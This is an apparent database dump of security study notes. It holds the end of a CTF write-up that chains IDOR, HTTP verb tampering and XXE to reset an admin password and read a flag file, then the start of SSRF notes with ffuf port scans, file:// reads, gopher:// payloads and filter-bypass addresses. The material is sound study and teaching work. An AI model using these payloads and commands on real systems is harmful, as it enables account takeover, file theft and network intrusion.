curl -s "http://154.57.164.78:31956/api.php/token/52" \
  -H "Cookie: PHPSESSID=dpk5f8il07lfoth0an07qontrq; uid=74"
```

Command explained:
- `curl -s ".../api.php/token/52"` requests the reset token for **uid 52** (the admin we found in Step 1), silently.
- `-H "Cookie: ...; uid=74"` again sends our own session — we are still logged in as uid 74, yet the server hands over uid 52''s token because there is no ownership check. That is the second IDOR.

**Response:**

```json
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

We now hold the admin''s valid password-reset token without ever being the admin.

---

## Step 3: HTTP Verb Tampering — Bypass Auth on reset.php

### Discovery — Reading settings.php Source Code

After accessing the admin profile page (`profile.php`) by changing our `uid` cookie to `52`, we noticed a **Settings** link in the navigation header. We fetched `settings.php` source code directly with curl:

```shellsession
curl -s "http://154.57.164.78:31956/settings.php" \
  -H "Cookie: PHPSESSID=dpk5f8il07lfoth0an07qontrq; uid=52"
```

- `-s` fetches quietly; `-H "Cookie: ...; uid=52"` sends the request with the uid cookie set to 52, so the page renders as the admin would see it.

The page returned a password change form and — crucially — the full JavaScript logic in the `<head>`:

```javascript
<script>
  function resetPassword() {
    if ($("#new_password").val() == $("#confirm_new_password").val()) {
      fetch(`/api.php/token/${$.cookie("uid")}`, {
        method: ''GET''
      }).then(function(response) {
        return response.json();
      }).then(function(json) {
        fetch(`/reset.php`, {
          method: ''POST'',
          headers: {
            ''Content-Type'': ''application/x-www-form-urlencoded''
          },
          body: `uid=${$.cookie("uid")}&token=${json[''token'']}&password=${$("#new_password").val()}`
        }).then(function(response) {
          return response.text();
        }).then(function(res) {
          $("#error_string").html(res);
        });
      });
    }
  };
</script>
```

This revealed two critical things:

1. **`/api.php/token/{uid}`** — a token fetch endpoint that reads uid from the cookie (no server-side auth)
2. **`/reset.php`** — the hidden password reset endpoint that accepts `uid`, `token`, and `password` as POST parameters

This is why **always reading page source and JavaScript is essential** — the endpoint `/reset.php` was never linked anywhere in the UI and would have been very hard to find by brute-forcing alone.

### How the Reset Flow Works

Reading the `settings.php` source code revealed the password reset flow:

```javascript
fetch(`/api.php/token/${$.cookie("uid")}`)
  .then(json => {
    fetch(`/reset.php`, {
      method: ''POST'',
      headers: { ''Content-Type'': ''application/x-www-form-urlencoded'' },
      body: `uid=${$.cookie("uid")}&token=${json[''token'']}&password=${newpass}`
    })
  })
```

In short: the page first fetches the token for the uid in the cookie, then POSTs `uid`, `token`, and the new `password` to `/reset.php`.

### The Problem

Direct POST to `reset.php` with `uid=52` returned **"Access Denied"** because the backend PHP logic checked:

```php
$_COOKIE[''uid''] === $_REQUEST[''uid'']
```

Our session cookie had `uid=74` (our own account), so the check failed for `uid=52`. In other words, the server compares the uid in our cookie to the uid in the request and refuses if they differ.

### The Bypass

PHP''s `$_REQUEST` superglobal reads from **both** `$_GET` (URL query string) **and** `$_POST` (request body). By passing the parameters as a **URL query string** instead of the POST body, with `uid=52` set in our cookie, the authorization check passed:

```shellsession
curl -s -X POST \
  "http://154.57.164.78:31956/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=hacked123" \
  -H "Cookie: PHPSESSID=at9d94qgn8s1730qh9d35qdd9o; uid=52" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Length: 0"
```

Command explained step by step:
- `-s` runs quietly; `-X POST` forces the **POST** method (the endpoint expects POST).
- The parameters (`uid=52`, the stolen `token`, and `password=hacked123`) are placed in the **URL query string**, so they land in `$_GET` — and therefore in `$_REQUEST`.
- `-H "Cookie: ...; uid=52"` sets our cookie uid to 52, so `$_COOKIE[''uid''] === $_REQUEST[''uid'']` becomes `52 === 52` and passes.
- `-H "Content-Type: application/x-www-form-urlencoded"` matches what the endpoint expects.
- `-H "Content-Length: 0"` tells the server the POST **body is empty** — because we deliberately put everything in the query string instead of the body. This is the verb-tampering trick: same action, parameters moved to a place the auth logic still trusts.

**Response:**

```
Password changed successfully
```

---

## Step 4: Login as Administrator

With the password reset, we logged in as `a.corrales`:

```shellsession
curl -s -X POST "http://154.57.164.78:31956/index.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -D - \
  -d "username=a.corrales&password=hacked123" | grep "Set-Cookie"
```

Command explained:
- `-X POST .../index.php` submits the login form via POST.
- `-d "username=a.corrales&password=hacked123"` sends the admin username with the password we just set.
- `-D -` dumps the **response headers** to stdout (`-` means "to the terminal"), so we can see the session cookies the server issues.
- `| grep "Set-Cookie"` filters the output to just the `Set-Cookie` lines.

**Response:**

```
Set-Cookie: PHPSESSID=gt6iagivdv4sqnlqcb86k1o7jr; path=/
Set-Cookie: uid=52; expires=Mon, 26-Oct-2026 08:17:08 GMT; Max-Age=2592000; path=/
```

Successfully authenticated as **Amor Corrales (Administrator)**.

---

## Step 5: XXE Injection on /addEvent.php

### Discovery

As admin, the `event.php` page allowed creating events with XML data submitted to `/addEvent.php`. The XML parser had external entity processing enabled, making it vulnerable to XXE injection.

The endpoint was discovered by reading the page''s JavaScript source — always inspect JS before brute-forcing.

### Payload

We used `php://filter` to base64-encode the file contents before returning them. This prevents the XML parser from breaking on special characters (`<`, `>`, `&`) that may appear in PHP source files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
  <name>&xxe;</name>
  <details>test</details>
  <date>2026-09-08</date>
</root>
```

How the payload works:
- `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">` defines an external entity `xxe` that reads `/flag.php` and base64-encodes it.
- `<name>&xxe;</name>` references the entity in the `name` field, which is the value echoed back in the response — so the encoded flag file is returned to us.

**Request:**

```http
POST /addEvent.php HTTP/1.1
Host: 154.57.164.78:31956
Content-Type: text/plain;charset=UTF-8
Cookie: PHPSESSID=gt6iagivdv4sqnlqcb86k1o7jr; uid=52
```

**Response:**

```
Event ''PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K'' has been created.
```

The event "name" in the response is the base64-encoded contents of `/flag.php`.

---

## Step 6: Decode the Flag

```shellsession
echo "PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K" | base64 -d
```

Command explained:
- `echo "..."` prints the base64 string returned in the response.
- `| base64 -d` **decodes** it back to the original PHP file contents.

**Output:**

```php
<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

---

## 🚩 Flag

```
HTB{m4573r_w3b_4774ck3r}
```

---

## Vulnerability Summary

| # | Vulnerability       | Endpoint               | Impact                                        |
| - | ------------------- | ---------------------- | --------------------------------------------- |
| 1 | IDOR                | `/api.php/user/{id}`   | Full user enumeration (100 users)             |
| 2 | IDOR                | `/api.php/token/{uid}` | Steal any user''s password reset token         |
| 3 | HTTP Verb Tampering | `/reset.php`           | Bypass authorization → admin account takeover |
| 4 | XXE Injection       | `/addEvent.php`        | Read arbitrary files from the server          |

---

## Key Takeaways

- **Always read JavaScript source** — it revealed hidden endpoints (`reset.php`, `addEvent.php`) and the reset flow logic.
- **IDOR isn''t just for data** — token endpoints are just as dangerous as user data endpoints.
- **HTTP Verb Tampering** exploits PHP''s `$_REQUEST`, which merges GET and POST — always test parameters in the URL query string when POST is denied.
- **XXE + php://filter** is the reliable way to read PHP files since direct file read breaks on `<?php` tags.
- **Chaining vulnerabilities** — none of these alone gave the flag; the full chain was required.', NULL, 'PUBLISHED', 'PUBLIC', 63, 'cmvfonfhr00ayida0a37aijsy', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792500536.678), to_timestamp(1792500536.678), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvgophtn002widhwti07d22p', 'Server-Side Attacks', 'server-side-attacks', 'Complete notes on server-side attacks covering SSRF (confirmation, internal port scanning, restricted-endpoint access, file:// LFI, gopher:// to internal services, and blind SSRF), SSTI in Jinja2 and Twig (confirmation, engine fingerprinting, information disclosure, LFI, and RCE), SSI injection via directives like printenv and exec, and XSLT server-side injection (information disclosure, LFI, and RCE through PHP functions), with prevention through input validation, whitelisting, sandboxing, and least privilege.', '# Server-Side Attacks — Detailed Notes

> A deep, beginner-friendly walkthrough of the four main server-side vulnerability classes:
> **SSRF, SSTI, SSI Injection, and XSLT Injection.** Every section, heading, and subheading
> from the module is kept. Each concept is explained in plain English, every command and
> payload is broken down flag by flag, and each section ends with a CTF-style documentation
> block you can paste into a write-up.

---

## Table of Contents

1. [Introduction to Server-Side Attacks](#1-introduction-to-server-side-attacks)
   - 1.1 [Server-Side vs Client-Side](#11-server-side-vs-client-side)
   - 1.2 [The Four Vulnerability Classes](#12-the-four-vulnerability-classes)
   - 1.3 [How to Approach This Module](#13-how-to-approach-this-module)
2. [Server-Side Request Forgery (SSRF)](#2-server-side-request-forgery-ssrf)
   - 2.1 [What SSRF Is](#21-what-ssrf-is)
   - 2.2 [Why SSRF Is Dangerous](#22-why-ssrf-is-dangerous)
   - 2.3 [URL Schemes Used in SSRF](#23-url-schemes-used-in-ssrf)
   - 2.4 [Identifying and Confirming SSRF](#24-identifying-and-confirming-ssrf)
   - 2.5 [Blind vs Non-Blind SSRF](#25-blind-vs-non-blind-ssrf)
   - 2.6 [Enumerating the System (Internal Port Scanning)](#26-enumerating-the-system-internal-port-scanning)
   - 2.7 [Accessing Restricted Endpoints](#27-accessing-restricted-endpoints)
   - 2.8 [Local File Inclusion via file://](#28-local-file-inclusion-via-file)
   - 2.9 [The gopher:// Protocol](#29-the-gopher-protocol)
   - 2.10 [Automating gopher with Gopherus](#210-automating-gopher-with-gopherus)
   - 2.11 [Exploiting Blind SSRF](#211-exploiting-blind-ssrf)
   - 2.12 [Preventing SSRF](#212-preventing-ssrf)
3. [Server-Side Template Injection (SSTI)](#3-server-side-template-injection-ssti)
   - 3.1 [Template Engines Explained](#31-template-engines-explained)
   - 3.2 [Templating Syntax and Rendering](#32-templating-syntax-and-rendering)
   - 3.3 [What SSTI Is](#33-what-ssti-is)
   - 3.4 [How SSTI Creeps Into Code](#34-how-ssti-creeps-into-code)
   - 3.5 [Confirming SSTI](#35-confirming-ssti)
   - 3.6 [Identifying the Template Engine](#36-identifying-the-template-engine)
   - 3.7 [Exploiting SSTI — Jinja2](#37-exploiting-ssti--jinja2)
   - 3.8 [Exploiting SSTI — Twig](#38-exploiting-ssti--twig)
   - 3.9 [Tools of the Trade — SSTImap](#39-tools-of-the-trade--sstimap)
   - 3.10 [Preventing SSTI](#310-preventing-ssti)
4. [Server-Side Includes (SSI) Injection](#4-server-side-includes-ssi-injection)
   - 4.1 [What SSI Is](#41-what-ssi-is)
   - 4.2 [SSI Directives](#42-ssi-directives)
   - 4.3 [How SSI Injection Happens](#43-how-ssi-injection-happens)
   - 4.4 [Exploiting SSI Injection](#44-exploiting-ssi-injection)
   - 4.5 [Preventing SSI Injection](#45-preventing-ssi-injection)
5. [XSLT Server-Side Injection](#5-xslt-server-side-injection)
   - 5.1 [What XSLT Is](#51-what-xslt-is)
   - 5.2 [Core XSL Elements](#52-core-xsl-elements)
   - 5.3 [XSLT Injection Explained](#53-xslt-injection-explained)
   - 5.4 [Identifying XSLT Injection](#54-identifying-xslt-injection)
   - 5.5 [Information Disclosure](#55-information-disclosure)
   - 5.6 [Local File Inclusion](#56-local-file-inclusion)
   - 5.7 [Remote Code Execution](#57-remote-code-execution)
   - 5.8 [Preventing XSLT Injection](#58-preventing-xslt-injection)
6. [Module Summary & Attacker Methodology](#6-module-summary--attacker-methodology)

---

# 1. Introduction to Server-Side Attacks

---

## 1.1 Server-Side vs Client-Side

The single most important idea to grasp before studying these attacks is *where the malicious code actually executes*. This one distinction decides how you test for the bug, how you exploit it, and how severe it is. **Server-side attacks** target the application, service, or logic running on the server — the attacker''s goal is to make the server itself do something it was never meant to do, such as reading its own files or running system commands. **Client-side attacks**, by contrast, run on the victim''s own machine, almost always inside their web browser, and do not directly compromise the server at all. A classic client-side example is Cross-Site Scripting (XSS): the injected JavaScript runs in another user''s browser, not on the server. Every vulnerability in this module is strictly server-side, which is why they tend to be so dangerous — a successful attack often means direct access to the server, its internal network, and its data.

A simple mental test helps you classify any bug you find: ask yourself *"whose machine runs my payload?"* If the answer is the server, it is a server-side issue and belongs to this module''s families. If the answer is another user''s browser, it is a client-side issue like XSS or CSRF. Keeping this question in mind stops you from wasting time trying browser-based tricks on a server-side flaw, or vice versa.

---

## 1.2 The Four Vulnerability Classes

This module focuses on four separate classes of server-side vulnerability. Although they abuse completely different server features, they share a single root cause and frequently lead to the same catastrophic outcomes — sensitive data disclosure or full remote code execution (RCE). Learning all four gives you a broad, transferable toolkit, because once you understand the pattern (untrusted input reaching a powerful server feature) you can recognize it anywhere. The table below is your map for the rest of these notes; each class gets its own full part later on.

| # | Class | Abbreviation | Server feature it abuses | Typical worst case |
|---|-------|--------------|--------------------------|--------------------|
| 1 | Server-Side Request Forgery | **SSRF** | The server making HTTP (or other) requests from user input. | Internal network access, cloud credential theft, RCE via internal services. |
| 2 | Server-Side Template Injection | **SSTI** | The server rendering templates built from user input. | Full RCE on the web server. |
| 3 | Server-Side Includes Injection | **SSI Injection** | SSI directives in HTML being processed by the web server. | Command execution via the `exec` directive. |
| 4 | XSLT Server-Side Injection | **XSLT Injection** | XSLT transformations the server runs on XML. | File read + RCE when external/PHP functions are enabled. |

---

## 1.3 How to Approach This Module

Across all four vulnerability classes, the attacker workflow is remarkably consistent, and internalizing it early makes every section feel familiar. First you **confirm** the vulnerability exists — usually by sending a deliberately malformed or special input and watching for a tell-tale change in behavior (an error, a reflected value, a callback). Next you **fingerprint** the underlying technology, because the exact engine, library, or protocol decides which payloads will work. Then you **escalate** carefully, moving from low-impact proof (information disclosure) up to high-impact exploitation (file read, then command execution), always preferring a harmless proof-of-concept over destructive actions. Finally you **document** everything with clean, repeatable reproduction steps and evidence. Keep this four-step loop — confirm, fingerprint, escalate, document — in your head and every section below slots neatly into it.

**The loop expanded into a practical checklist:**

1. **Map the attack surface.** Look for features that fetch URLs (SSRF), reflect your input into a page (SSTI), serve `.shtml`/write input to disk (SSI), or transform XML (XSLT). Note every user-controllable parameter.
2. **Confirm safely.** Use a non-destructive probe first — a listener callback for SSRF, the universal probe `${{<%[%''"}}%\.` for SSTI, `<!--#printenv -->` for SSI, a lone `<` for XSLT. You want *evidence of processing*, not immediate exploitation.
3. **Fingerprint the technology.** Identify the exact engine, library, protocol, and version, because that decides which payloads will work (Jinja vs Twig, XSLT 1.0 vs 2.0, PHP functions on vs off).
4. **Escalate gradually.** Move from information disclosure → local file read → command execution. At each step prefer a harmless proof (read `/etc/passwd`, run `id`) over destructive actions.
5. **Document as you go.** Capture the exact request, the exact payload, and the exact response for every step, so the finding is reproducible and the severity is defensible.
6. **Recommend a fix.** Tie each finding to the concrete mitigation from its "Preventing…" section, so your report is actionable, not just alarming.

This checklist is deliberately generic — it applies equally to all four vulnerability classes, which is the whole point. The specifics change per class; the discipline does not.

---

### Documentation Example (CTF-style write-up)

> **Recon note:** Classifying the attack surface before testing.
>
> | Observed behavior | Suspected class | First test |
> |-------------------|-----------------|-----------|
> | App fetches a user-supplied URL | SSRF | Point URL at my listener |
> | App reflects my input into a page | SSTI | Inject `${{<%[%''"}}%\.` then `{{7*7}}` |
> | App serves `.shtml` / writes input to disk | SSI injection | Submit `<!--#printenv -->` |
> | App transforms XML → HTML with my input | XSLT injection | Submit `<` and watch for `500` |
>
> **Methodology:** confirm → fingerprint → escalate (info disclosure → LFI → RCE) → document.
>
> **Screenshot placeholder:** `[ Attach attack-surface mapping notes here ]`

---

# 2. Server-Side Request Forgery (SSRF)

---

## 2.1 What SSRF Is

Server-Side Request Forgery is a vulnerability — part of the OWASP Top 10 — that allows an attacker to manipulate a web application into sending unauthorized requests *from the server*. It typically arises whenever an application makes HTTP requests (or other network requests) to another system based on data the user supplies, most commonly a URL. The crucial, defining feature of SSRF is the origin of the request: it comes from the **server**, not the attacker. That shift in origin is what makes the vulnerability so powerful, because the server usually sits in a trusted position — inside the corporate network, behind the firewall, and often with permission to reach internal-only systems. When you coerce the server into making requests for you, you effectively borrow all of that trust and reach.

Put plainly: SSRF happens when a web server fetches a remote resource and lets *you* choose the address it fetches from. If the application takes a URL like `http://internal-service/report` from user input and dutifully retrieves it, an attacker can swap that URL for anything they like and make the server fetch it instead.

---

## 2.2 Why SSRF Is Dangerous

At first glance, "the server fetches a URL I gave it" might not sound alarming — but the consequences depend entirely on the application''s configuration and network position, and they can be devastating. Because the request originates server-side, SSRF can let an attacker access internal systems that are completely unreachable from the public internet, bypass firewalls and network-based access controls, and retrieve sensitive information such as internal application data or cloud metadata. In cloud environments, SSRF is especially feared because it can reach the instance metadata service and steal temporary credentials. Even in a modest setup, SSRF can be used to scan the internal network, locate internal services, and interact with them.

A further escalation lever is the **URL scheme**. If the application trusts whatever scheme the user supplies (rather than hardcoding `http`), an attacker can switch schemes to provoke entirely different behavior — reading local files, or sending raw bytes to arbitrary services. That is why scheme manipulation is treated as a first-class SSRF technique and covered in detail next.

**Cloud metadata — the highest-value SSRF target in the wild.** On cloud-hosted servers (AWS, GCP, Azure), a special internal address — most famously `http://169.254.169.254/` — serves instance metadata, which frequently includes temporary IAM credentials. An SSRF that can reach this endpoint can steal those credentials and pivot into the victim''s cloud account. This module''s labs focus on classic internal-network SSRF, but in real engagements `169.254.169.254` is one of the first internal targets worth trying once you have a working SSRF, because the payoff is so high. Modern clouds mitigate this with IMDSv2 (which requires a token), but misconfigured or legacy instances remain exposed.

---

## 2.3 URL Schemes Used in SSRF

The scheme (the part before `://` in a URL) tells the server *how* to fetch the resource, and changing it changes what the attack can do. If the web application relies on a user-supplied scheme, you can often do far more than fetch web pages. The three schemes below are the ones most commonly abused during SSRF exploitation, and knowing exactly what each one unlocks is essential for escalating an SSRF from "interesting" to "critical."

| Scheme | What it does | How attackers use it in SSRF |
|--------|--------------|------------------------------|
| `http://` and `https://` | Fetch content over standard HTTP/S requests. | Bypass WAFs, reach restricted endpoints, access internal-network services. |
| `file://` | Read a file directly from the local filesystem. | Read local files on the web server (effectively LFI) — `/etc/passwd`, source code, configs. |
| `gopher://` | Send **arbitrary bytes** to a given host:port TCP socket. | Build raw HTTP POST requests, or talk to non-HTTP services (SMTP, MySQL, Redis, etc.). |

**Why schemes matter so much:** `http://` is limited to GET-style fetches, so it can read internal pages but cannot, for example, submit a login form. `file://` ignores the network entirely and reads the disk. `gopher://` is the most powerful because it gives you byte-level control of what gets sent, letting you forge any protocol you can describe. Much of SSRF escalation is really about moving from `http://` to `gopher://`.

**Note:** For advanced SSRF topics such as filter bypasses and DNS rebinding (useful when the app tries to block internal addresses), see HTB Academy''s *Modern Web Exploitation Techniques* module.

### Common Filter-Bypass Tricks (quick reference)

Many applications try to block SSRF by filtering out obvious internal addresses like `127.0.0.1` or `localhost`. These denylist-style filters are notoriously weak, and the following representations of the loopback/internal address often slip past them. Keep these in your back pocket whenever a naive filter blocks your first attempt — they exploit the many equivalent ways an IP can be written.

| Technique | Example | Why it works |
|-----------|---------|--------------|
| Alternate loopback IPs | `http://127.0.0.2/`, `http://127.1/` | Still routes to loopback but dodges exact-string filters. |
| Decimal IP | `http://2130706433/` | `2130706433` is the decimal form of `127.0.0.1`. |
| Octal / hex IP | `http://0177.0.0.1/`, `http://0x7f.0.0.1/` | Octal/hex notation of the same address. |
| IPv6 loopback | `http://[::1]/`, `http://[::ffff:127.0.0.1]/` | IPv6 forms of loopback the filter may not cover. |
| DNS that resolves inward | `http://localtest.me/` | A public domain that resolves to `127.0.0.1`. |
| Enclosed-alphanumerics / case | `http://localhost/` vs `http://LOCALHOST/` | Case or unusual encodings bypass case-sensitive filters. |

These are only representations of the *address* — they don''t defeat a proper allowlist, which is exactly why allowlisting (not denylisting) is the correct defense, as covered in section 2.12.

---

## 2.4 Identifying and Confirming SSRF

To find SSRF, hunt for any feature where the server fetches something based on a value you control — URL fields, webhook configuration, PDF/image generators that take a URL, "import from URL" features, and so on. In the sample web application, the front page offers appointment scheduling; when you check a date''s availability, Burp shows a POST request containing your chosen date **and** a URL in a `dateserver` parameter. That URL strongly implies the server retrieves availability information from a separate system, which is exactly the shape of an SSRF-prone feature. The next step is to prove the server really is making requests for you.

The most reliable confirmation technique is an **out-of-band callback**: point the vulnerable parameter at a listener you control and see if a connection arrives. If your listener logs a request, the server is making requests on your behalf — SSRF confirmed.

**Step 1 — Start a listener on your attack host** (plain `netcat` works well):

```bash
$ nc -lnvp 8000

listening on [any] 8000 ...
```

`-l` listen, `-n` no DNS resolution, `-v` verbose, `-p 8000` on port 8000.

**Step 2 — Point the vulnerable parameter at your listener.** Set `dateserver=http://<YOUR_IP>:8000/ssrf` and send the request. A hit like this confirms the server reached out:

```
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

The incoming `GET /ssrf` proves the server fetched your URL — the `dateserver` parameter is SSRF-vulnerable.

**Step 3 — Determine whether the response is reflected to you** by pointing the app at itself:

```
dateserver=http://127.0.0.1/index.php
```

If the HTTP response you receive contains the web application''s own HTML source, then the fetched content is being shown back to you — the SSRF is **not blind**. This matters enormously, because a non-blind SSRF unlocks far more exploitation than a blind one.

---

## 2.5 Blind vs Non-Blind SSRF

Before diving into exploitation, it is worth clearly separating the two flavors of SSRF, because they determine which of the following techniques are even available to you. A **non-blind** SSRF reflects the fetched response back to you in some form — you can read internal pages, dump files, and see service banners. A **blind** SSRF makes the server perform the request, but you never see the result; you only get a generic success/failure message. Most real-world SSRF is at least partially blind, which reduces impact, but blind SSRF is still useful for enumeration and for firing payloads at internal services you cannot see.

| Aspect | Non-blind SSRF | Blind SSRF |
|--------|----------------|------------|
| Fetched response | Reflected back to you | Hidden from you |
| Read internal pages | Yes | No |
| Read local files (`file://`) | Yes | No (but can sometimes detect file *existence*) |
| Port/host enumeration | Yes, read banners | Only if responses differ for open/closed |
| Overall impact | High | Lower, but still exploitable |

Everything in sections 2.6–2.10 assumes **non-blind** SSRF (you can read responses). Section 2.11 covers what remains possible when the SSRF is **blind**.

---

## 2.6 Enumerating the System (Internal Port Scanning)

Once SSRF is confirmed and non-blind, one of the first high-value things you can do is turn the vulnerable server into an **internal port scanner**. The server can reach `127.0.0.1` and other internal addresses that you cannot, so by making it connect to many ports in turn and observing how the response differs, you can map out which internal services are running. The whole technique hinges on being able to *infer* "open" versus "closed" from the response. In the sample app, requesting a port you expect to be closed (such as `81`) returns a recognizable error message, which gives you exactly the signal you need: anything *without* that error is an open port.

**Step 1 — Build a wordlist of ports to scan.** Here we test the first 10,000 ports:

```bash
$ seq 1 10000 > ports.txt
```

`seq 1 10000` prints the numbers 1 through 10000, one per line; `>` saves them into `ports.txt`.

**Step 2 — Fuzz every port through the SSRF, filtering out the "closed" error.** We use `ffuf`:

```bash
$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
  -fr "Failed to connect to"
```

**Flag-by-flag breakdown:**

- `-w ./ports.txt` — the wordlist of ports; each entry is substituted into `FUZZ`.
- `-u http://172.17.0.2/index.php` — the vulnerable endpoint.
- `-X POST` — send a POST request, matching how the real app submits.
- `-H "Content-Type: application/x-www-form-urlencoded"` — declare the body encoding.
- `-d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01"` — the POST body; `FUZZ` becomes each port number inside the internal URL.
- `-fr "Failed to connect to"` — **filter by regex**: hide every response containing the closed-port error text, so only open ports remain in the output.

**Example result:**

```
[Status: 200, Size: 45,   Words: 7,    Lines: 1,   Duration: 0ms]    FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]  FUZZ: 80
```

Port `80` is the web service and port `3306` is a MySQL database — both internal services now visible through the SSRF. If other internal apps were running, you could discover and access them the same way.

---

## 2.7 Accessing Restricted Endpoints

SSRF shines at reaching hosts and pages that block you directly but trust the server. In the sample, the application fetches availability from `dateserver.htb`; if you add that domain to your own hosts file and try to browse it, you get a `403 Forbidden` — direct access is blocked. However, the *server* is allowed to reach `dateserver.htb`, so you can proxy your enumeration **through** the SSRF. A particularly productive move is a directory/file brute-force aimed at the internal domain, run entirely through the vulnerable parameter, to discover hidden internal endpoints like admin panels.

To brute-force cleanly, you first learn what a "not found" or "forbidden" response looks like through the SSRF, then filter on a string unique to the default Apache error pages so only *real* pages show up. Because the app runs PHP, you append the `.php` extension to each guess.

**Step 1 — Brute-force internal endpoints through the SSRF:**

```bash
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
  -u http://172.17.0.2/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
  -fr "Server at dateserver.htb Port 80"
```

**Flag-by-flag breakdown:**

- `-w .../raft-small-words.txt` — a wordlist of common page/endpoint names.
- `-d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01"` — `FUZZ` is the page name; `.php` is appended since the app is PHP.
- `-fr "Server at dateserver.htb Port 80"` — filter out the default Apache 404/403 error text (which contains this string), so only valid pages appear. This single filter removes both 404s and 403s at once.

**Example result:**

```
[Status: 200, Size: 361, ...]  FUZZ: admin
[Status: 200, Size: 11,  ...]  FUZZ: availability
```

You''ve found an internal `admin` endpoint. You can now reach it through the SSRF by setting `dateserver=http://dateserver.htb/admin.php`, potentially exposing sensitive admin functionality that was supposed to be internal-only.

---

## 2.8 Local File Inclusion via file://

Because the URL scheme is part of the attacker-controlled URL, you can change `http://` to `file://` and make the server read from its own disk instead of the network. This effectively converts the SSRF into a **Local File Inclusion (LFI)** primitive. Supplying a path like `file:///etc/passwd` makes the server open that file and return its contents in the response. From there you can read any file the web server user can access — `/etc/passwd` to enumerate users, configuration files to find credentials and secret keys, and crucially the web application''s **own source code**, which often reveals additional vulnerabilities and hardcoded secrets.

**Step 1 — Read a local file through the SSRF** by switching the scheme to `file://`:

```
dateserver=file:///etc/passwd
```

Note the three slashes: `file://` + `/etc/passwd` → `file:///etc/passwd`. The response now contains the contents of `/etc/passwd`.

**Useful follow-up targets once LFI works:**

- `file:///etc/passwd` — user accounts on the box.
- `file:///var/www/html/index.php` (or the app''s real path) — the application source code.
- `file:///etc/apache2/sites-enabled/000-default.conf` — virtual host / config details.
- Any config file that may contain DB credentials or API keys.

**A caveat on `file://` behavior.** The `file://` scheme reads whatever path you give it as raw bytes, so it works cleanly for text files like `/etc/passwd`. For files the application then tries to parse (for example if it expects the fetched content to be HTML or JSON), you may see the raw contents reflected, a parse error, or a partial render — all of which still confirm you''re reading the file. If a file seems to read but the output looks mangled, try viewing the raw HTTP response rather than the rendered page, since the browser may be interpreting the leaked contents as markup.

**Note:** For deeper LFI techniques (log poisoning, PHP wrappers, filter chains), see HTB Academy''s *File Inclusion* module.

---

## 2.9 The gopher:// Protocol

Plain `http://` SSRF only lets you issue GET-style requests, which is a real limitation: many internal endpoints need a **POST** request (for example, a login form that expects a password in the body). The `gopher://` scheme removes that limitation by letting you send **arbitrary bytes** to a TCP socket. Because you control the raw bytes, you can hand-craft a complete HTTP POST request — method, headers, blank line, and body — or even forge entirely non-HTTP protocols. This is what elevates SSRF from "read internal GET endpoints" to "interact with almost any internal service."

The tricky part is **encoding**, and getting it wrong is the most common reason gopher payloads fail. Every special character in your raw request must be URL-encoded: spaces become `%20`, and the CRLF line breaks that separate HTTP lines become `%0D%0A`. Then you prefix the scheme, host, port, and an underscore. Finally — and this is the step people forget — because your gopher URL is itself travelling *inside* an already-URL-encoded POST parameter, you must URL-encode the **entire gopher URL a second time**, or the outer server will mangle it and you''ll get a "Malformed URL" error.

**Step 1 — Write the raw internal POST request you want the server to send** (here, trying the password `admin` against an internal admin login):

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

**Step 2 — URL-encode it once and build the gopher URL** (prefix `gopher://host:port/_`):

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

Notice the single `%20` (space), `%0D%0A` (CRLF between headers), the double `%0D%0A%0D%0A` (blank line before the body), and `%3D` (the `=` in `adminpw=admin`).

**Step 3 — URL-encode the whole gopher URL a second time** and place it in the `dateserver` parameter. The final outer request looks like:

```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

See how each `%` from step 2 became `%25` here (double-encoding). When the outer server decodes once, it is left with the valid gopher URL from step 2, which it then processes — sending your crafted POST to the internal admin endpoint, which accepts the password and grants access to the admin dashboard.

